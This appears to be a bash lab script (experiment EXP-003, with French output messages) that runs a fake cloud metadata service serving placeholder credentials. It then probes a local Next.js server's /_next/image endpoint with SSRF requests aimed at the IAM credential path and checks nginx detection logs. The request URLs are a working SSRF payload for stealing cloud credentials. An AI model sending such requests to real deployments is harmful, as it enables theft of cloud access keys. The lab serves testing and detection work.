#!/bin/bash
set -u
ip addr add 169.254.169.254/32 dev lo
mkdir -p /imds/latest/meta-data/iam/security-credentials
echo -n "lab-role" > /imds/latest/meta-data/iam/security-credentials/index.html
echo '{"AccessKeyId":"FAKE-LAB-KEY","SecretAccessKey":"FAKE-LAB-SECRET","Token":"FAKE"}' > /imds/latest/meta-data/iam/security-credentials/lab-role
(cd /imds && python3 -m http.server 80 --bind 169.254.169.254 >/tmp/imds.log 2>&1 &)
nginx
LAB_IMAGES=$1 npx next start -H 127.0.0.1 -p 3000 >/tmp/next.log 2>&1 &
for i in $(seq 30); do curl -s -o /dev/null 127.0.0.1:3000 && break; sleep 1; done
echo "== EXP-003 LAB_IMAGES=$1 ; contrôle direct du faux IMDS :"; curl -s -i http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head -4 | tr -d '\r'
for p in "" "lab-role"; do
  curl -s -o /tmp/b -w "GET /_next/image?url=...security-credentials/$p -> %{http_code} %{content_type}\n" "http://127.0.0.1:8080/_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$p&w=64&q=75"
  echo "   corps: $(head -c 120 /tmp/b)"
done
echo "   requêtes reçues par le faux IMDS (hors contrôle direct) : $(($(grep -c 'GET /latest' /tmp/imds.log)-1))"
grep "GET /latest" /tmp/imds.log
echo "   Next.js log :"; grep -v -E "^\s*$|▲|Starting|Ready|Local|Network" /tmp/next.log | head -8
sleep 1; echo "   journal nginx enrichi :"; cat /var/log/nginx/detect.json
echo "   journal nginx par défaut :"; cat /var/log/nginx/default.log
